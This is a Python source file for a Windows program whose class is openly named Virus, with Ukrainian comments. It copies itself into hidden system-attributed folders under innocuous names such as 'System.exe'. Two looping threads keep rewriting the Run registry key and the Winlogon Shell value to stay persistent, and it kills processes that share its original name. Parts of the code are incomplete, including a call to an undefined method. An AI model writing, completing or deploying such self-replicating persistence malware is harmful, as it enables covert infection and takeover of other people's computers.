# -*- coding: utf-8 -*-
__author__ = 'wandors'
__name__ = "so3hx"
import os
import sys
import time
import winreg
import getpass
import tempfile
import platform
import shutil
import psutil
import win32file
import threading


class Virus:
    # Введення перемінних
    def __init__(self):
        self.x = 10
        self.dirss = "Internet\\"
        self.names = "System.exe"
        self.nameu = "usbint.exe"
        self.cmd = "cmd.exe"
        self.task = "taskmgr.exe"
        self.regedit = "regedit.exe"
        self.name = "explorers.exe"
        self.kiltask = "TOTALCMD.EXE"
        self.arge = sys.argv[0]
    # копіювання фалів
    def _vhod(self):
        self.reles = platform.release()
        if self.reles.lower() == "xp".lower():
            self.latdir = "C:\\Documents and Settings\\"
            self.path = self.latdir + getpass.getuser() + "\\Application Data\\\Microsoft\\Windows\\"
            self.paths = tempfile.gettempdir() + "\\"
        else:
            self.latdir = "C:\\users\\"
            self.path = self.latdir + getpass.getuser() + "\\AppData\\Local\\Microsoft\\Windows\\"
            self.paths = tempfile.gettempdir() + "\\"
        self._copi()

    def _copi(self):
        if not os.path.exists(self.path + self.dirss):
            os.mkdir(self.path + self.dirss)
        if not os.path.exists(self.path + self.dirss + self.name):
            shutil.copy(sys.argv[0], self.path + self.dirss)
            os.rename(self.path + self.dirss + os.path.basename(sys.argv[0]), self.path + self.dirss + self.name)
        else:
            try:
                os.remove(self.path + self.dirss + self.name)
                shutil.copy(sys.argv[0], self.path + self.dirss)
                os.rename(self.path + self.dirss + os.path.basename(sys.argv[0]), self.path + self.dirss + self.name)
            except:
                pass
        win32file.SetFileAttributes(self.path + self.dirss,
                                    win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_READONLY | win32file.FILE_ATTRIBUTE_SYSTEM)
        if not os.path.exists(self.paths + self.dirss):
            os.mkdir(self.paths + self.dirss)
        if not os.path.exists(self.paths + self.dirss + self.names):
            shutil.copy(sys.argv[0], self.paths + self.dirss)
            os.rename(self.paths + self.dirss + os.path.basename(sys.argv[0]), self.paths + self.dirss + self.names)
        else:
            try:
                os.remove(self.paths + self.dirss + self.names)
                shutil.copy(sys.argv[0], self.paths + self.dirss)
                os.rename(self.paths + self.dirss + os.path.basename(sys.argv[0]), self.paths + self.dirss + self.names)
            except:
                pass
        win32file.SetFileAttributes(self.paths + self.dirss,
                                    win32file.FILE_ATTRIBUTE_HIDDEN | win32file.FILE_ATTRIBUTE_READONLY | win32file.FILE_ATTRIBUTE_SYSTEM)
        #Запуск додаткових потоків
        self.trers = threading.Thread(target=lambda: self._crvbs())
        self.trers.start()
        self.trer = threading.Thread(target=lambda: self._crshell())
        self.trer.start()
        self._kil()
    #Запис в реєстр
    def _crvbs(self):
        while True:
            self.regs = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
            self.mykeys = winreg.OpenKey(self.regs, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
                                         winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(self.mykeys, 'System', 0, winreg.REG_SZ,
                              '"' + self.paths + self.dirss + self.names + '"' + " Minimum")
            winreg.CloseKey(self.mykeys)
            time.sleep(10)

    def _crshell(self, x=1):
        while True:
            print(x)
            self.regsh = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
            self.mykeysh = winreg.OpenKey(self.regsh, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", 0,
                                          winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(self.mykeysh, 'Shell', 0, winreg.REG_SZ,
                              "explorer.exe, " + self.path + self.dirss + self.name)
            winreg.CloseKey(self.mykeysh)
            time.sleep(10)
    # Обропка процесів файла
    def _kil(self):
        if os.path.basename(self.arge.lower()) == self.names.lower():
            pass
        else:
            for u in psutil.process_iter():
                try:
                    if u.name().lower() == os.path.basename(self.arge.lower()):
                        u.kill()
                except:
                    pass
        self._runs()

    def _runs(self):
        self.tref = threading.Thread(target=lambda: self.timeswo())
        self.tref.start()


if __name__ == "__main__":
    m = Virus()
    m._vhod()
